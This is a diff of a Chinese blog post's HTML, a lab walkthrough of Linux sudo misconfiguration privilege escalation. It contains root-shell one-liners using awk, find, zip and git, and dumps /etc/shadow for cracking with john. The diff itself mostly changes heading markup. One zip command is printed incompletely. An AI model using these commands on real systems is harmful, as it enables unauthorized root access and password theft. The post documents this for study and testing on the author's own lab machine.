@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>sudo滥用提权 | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容 关于sudo sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。 要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到&#x2F;etc&#x2F;sudoers中 关于sudoers  sudoer">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>sudo滥用提权 | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容 关于sudosudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。 要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到&#x2F;etc&#x2F;sudoers中 关于sudoers sudoers文">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sudo滥用提权">
 <meta property="og:url" content="http://example.com/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="Don_Joshua&#39;s Blog">
-<meta property="og:description" content="上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容 关于sudo sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。 要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到&#x2F;etc&#x2F;sudoers中 关于sudoers  sudoer">
+<meta property="og:description" content="上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容 关于sudosudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。 要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到&#x2F;etc&#x2F;sudoers中 关于sudoers sudoers文">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/avatar.jpg">
 <meta property="article:published_time" content="2023-03-05T12:04:58.000Z">
@@ -155,19 +155,16 @@
       }
     }
     detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a id="site-name" href="/">Don_Joshua's Blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sudo滥用提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-05T12:04:58.000Z" title="发表于 2023-03-05 20:04:58">2023-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-11T12:12:23.944Z" title="更新于 2023-03-11 20:12:23">2023-03-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">962</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sudo滥用提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容</p>
-<h2 id="关于sudo">关于sudo</h2>
-<p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。</p>
+    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a id="site-name" href="/">Don_Joshua's Blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sudo滥用提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-05T12:04:58.000Z" title="发表于 2023-03-05 20:04:58">2023-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-11T12:12:23.944Z" title="更新于 2023-03-11 20:12:23">2023-03-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">954</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sudo滥用提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容</p>
+<h2 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。</p>
 <p>要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到<code>/etc/sudoers</code>中</p>
-<h2 id="关于sudoers">关于sudoers</h2>
-<blockquote>
+<h2 id="关于sudoers"><a href="#关于sudoers" class="headerlink" title="关于sudoers"></a>关于sudoers</h2><blockquote>
 <p>sudoers文件主要有三部分组成：</p>
 <p>sudoers的默认配置（default） 主要设置sudo的一些缺省值</p>
 <p>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Dmnd_Alias</p>
 <p>安全策略（规则定义）</p>
 </blockquote>
-<h3 id="语法：">语法：</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure>
+<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure>
 <p>解释：root用户可以从 ALL（任意）终端作为ALL（任意）用户执行ALL（任意）命令</p>
 <p>即 <strong>用户 终端 可充当的用户 使用时可以运行的命令</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">hacker ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>
@@ -175,19 +172,15 @@
 <p>hacker同上，因此此时的hacker就相当于root用户了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker ALL=(root) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure>
 <p>解释：hacker用户可以从 ALL（任意）终端作为root用户<strong>无密码</strong>执行awk命令</p>
-<h3 id="查看用户能以root权限运行的命令">查看用户能以root权限运行的命令</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<h2 id="sudo提权命令">sudo提权命令</h2>
-<blockquote>
+<h3 id="查看用户能以root权限运行的命令"><a href="#查看用户能以root权限运行的命令" class="headerlink" title="查看用户能以root权限运行的命令"></a>查看用户能以root权限运行的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<h2 id="sudo提权命令"><a href="#sudo提权命令" class="headerlink" title="sudo提权命令"></a>sudo提权命令</h2><blockquote>
 <p>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</p>
 </blockquote>
 <p>就先到这里，以后具体的例子会单独找案例进行分析</p>
 <hr>
 <p>更新，这里直接搭建一个环境，把常见的总结一下吧，后面遇到了再继续补充</p>
-<h2 id="复现与总结">复现与总结</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
-<h3 id="搭建环境">搭建环境</h3>
-<p>首先新建一个用户hacker，<code>vim /etc/sudoers</code>并在/etc/sudoers中加入以上的代码</p>
+<h2 id="复现与总结"><a href="#复现与总结" class="headerlink" title="复现与总结"></a>复现与总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
+<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>首先新建一个用户hacker，<code>vim /etc/sudoers</code>并在/etc/sudoers中加入以上的代码</p>
 <p><img src="image-20230308201152439.png" alt="image-20230308201152439"></p>
 <p>先给靶机上的hacker用户修改个密码 <code>passwd hacker</code></p>
 <p><img src="image-20230308201402730.png" alt="image-20230308201402730"></p>
@@ -195,18 +188,15 @@
 <p><img src="image-20230308201639147.png" alt="image-20230308201639147"></p>
 <p><code>sudo -l</code>查看允许当前用户使用的命令，这里我们主要寻找能以root权限执行的命令，如下图，那么，下面我们就一个一个来实践进行提权</p>
 <p><img src="image-20230308201901240.png" alt="image-20230308201901240"></p>
-<h3 id="awk">awk</h3>
-<p>awk的相应提权方法为：</p>
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk的相应提权方法为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
 <p><img src="image-20230308202438207.png" alt="image-20230308202438207"></p>
 <p>提权成功！</p>
-<h3 id="find">find</h3>
-<p>find的相应提权命令为：</p>
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find的相应提权命令为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></table></figure>
 <p><img src="image-20230308202802004.png" alt="image-20230308202802004"></p>
 <p>提权成功！</p>
-<h3 id="cat">cat</h3>
-<p>cat比较麻烦一点，我们可以使用cat查看文件/etc/shadow找到加密后的用户名密码，之后再用john破解</p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>cat比较麻烦一点，我们可以使用cat查看文件/etc/shadow找到加密后的用户名密码，之后再用john破解</p>
 <p>演示：1.使用<code>sudo cat /etc/shadow &gt;&gt; 1.txt</code> 读取shadow文件到1.txt中</p>
 <!--(上面我们写入sudoers文件时没有写入`hacker  ALL=(root) NOPASSWD: /usr/bin/cat` 这一条，因此要实现cat的引用需要加上这一条，也就是实战时需要满足这个条件)-->
 <p><img src="image-20230308231813556.png" alt="image-20230308231813556"></p>
@@ -217,11 +207,9 @@
 <blockquote>
 <p>关于unshadow的使用：<img src="image-20230308233157219.png" alt="image-20230308233157219"></p>
 </blockquote>
-<pre><code>		2.使用john破解密码：
-</code></pre>
-<p>这里实现的时候有些问题，有时候快有时候慢，等解决了再过来补充</p>
-<h3 id="zip">zip</h3>
-<p>这里就是解压缩命令zip了，首先安装zip命令<code>apt install zip</code></p>
+<pre><code>          2.使用john破解密码：
+</code></pre><p>这里实现的时候有些问题，有时候快有时候慢，等解决了再过来补充</p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>这里就是解压缩命令zip了，首先安装zip命令<code>apt install zip</code></p>
 <p><img src="image-20230311191243971.png" alt="image-20230311191243971"></p>
 <p>有就不用了</p>
 <p>使用<code>touch 2.txt</code> 创建一个2.txt,并使用<code>zip 1.zip 2.txt</code> 生成一个1.zip</p>
@@ -231,8 +219,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo 1.zip 2.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure>
 <p><img src="image-20230311192656025.png" alt="image-20230311192656025"></p>
 <p>提权成功</p>
-<h3 id="git">git</h3>
-<p>git就比较简单了首先使用</p>
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>git就比较简单了首先使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br></pre></td></tr></table></figure>
 <p><img src="image-20230311193259077.png" alt="image-20230311193259077"></p>
 <p>命令，进入到该页面</p>
@@ -241,8 +228,7 @@
 <p><img src="image-20230311193703440.png" alt="image-20230311193703440"></p>
 <p><img src="image-20230311193718807.png" alt="image-20230311193718807"></p>
 <p>提权成功</p>
-<h3 id="ed">ed</h3>
-<p>安装ed</p>
+<h3 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h3><p>安装ed</p>
 <p><img src="image-20230311194608383.png" alt="image-20230311194608383"></p>
 <p>在sudoers中加入ed，这就不多说了</p>
 <p><img src="image-20230311194824177.png" alt="image-20230311194824177"></p>
